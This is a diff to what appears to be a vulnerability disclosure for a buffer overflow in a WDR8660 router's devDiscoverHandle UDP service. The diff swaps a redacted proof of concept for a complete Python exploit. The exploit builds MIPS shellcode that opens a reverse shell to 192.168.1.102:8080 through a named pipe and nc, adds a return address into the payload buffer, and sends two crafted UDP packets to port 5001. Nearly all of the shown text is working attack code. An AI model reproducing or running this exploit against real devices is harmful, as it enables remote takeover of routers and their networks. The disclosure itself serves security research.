@@ -14,14 +14,21 @@ This vulnerability happen when  devDiscoverHandle  receive data by using `recvfr
 
 Refer to this video: [poc_video.mkv](./poc_video.mkv)
 
-**poc**
+**poc&**
 
+It's for WDR8660
 ```
-
 import sys
 import struct
 import requests
 from pwn import *
+from time import sleep
+
+context.arch='mips'
+context.endian='little'
+
+udp_data_addr = 0x0419680
+
 def fix_checksum(data):
     checksum = 0
     for off in range(0, len(data), 2):
@@ -34,23 +41,50 @@ def fix_checksum(data):
     checksum &= 0xffff
     return p16(0xffff - checksum)
 
-magic = '\x01\x02\x0e\x00\xe1\x2b\x83\xc7'
-pad2 = '  ' + gadget.ljust(602-8-0x1d*0) + gadget1
-tmp = '\x00\x05'+p16(len(pad2))+pad2
-# gadget1 and gadget is ROPchain, here we don't show it.
+context.arch='mips'
+context.endian='little'
+
+magic = b'\x01\x02\x0e\x00\xe1\x2b\x83\xc7'
+shellcode = asm(shellcraft.nop()*0x8) + asm(shellcraft.execve(path = "/bin/sh", argv=['sh', '-c', 'mknod /tmp/a p; nc 192.168.1.102 8080 0</tmp/a | /bin/sh 1>/tmp/a 2>&1;']))
+
+gadget1 = p32(udp_data_addr + 0x300)
+pad2 = b'shellcode'.ljust(600-0x10, b'\x00') + gadget1
+
+context.endian='big'
+tmp = b'\x00\x05' + p16(len(pad2)) + pad2
+
 checksum = fix_checksum(magic + p16(len(tmp)) + tmp)
-payload = magic + checksum + p16(len(tmp)) + '\x00\x00' + tmp
+payload2 = magic + checksum + p16(len(tmp)) + b'\x00\x00' + tmp
 
-udpsever=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-udpsever.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
-udpsever.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-udpsever.bind(('', MCAST_PORT))
-mreq = struct.pack('4sl', socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
-udpsever.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+pad2 = b'helo'
+tmp = b'\x00\x05' + p16(len(pad2)) + pad2
+checksum = fix_checksum(magic + p16(len(tmp)) + tmp)
+payload1 = (magic + checksum + p16(len(tmp)) + b'\x00\x00' + tmp).ljust(0x300, b'\x00') + shellcode
 
+assert(len(payload1) < 0x5c0)
+assert(len(payload2) < 0x300)
+
+print("[*] Sending payload1")
 udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-udp.sendto(payload,(sys.argv[1],5001))
+udp.sendto(payload1,('192.168.1.1',5001))
 udp.close()
+
+sys.stdout.write('[*] Waiting for 20 seconds')
+i = 1
+while i <= 20:
+    sleep(1)
+    sys.stdout.write('.')
+    sys.stdout.flush()
+    i += 1
+
+print('')
+print("[*] Sending payload2")
+udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+udp.sendto(payload2,('192.168.1.1',5001))
+udp.close()
+sleep(1)
+print("[+] Success")
+
 ```
 
 ## Timeline
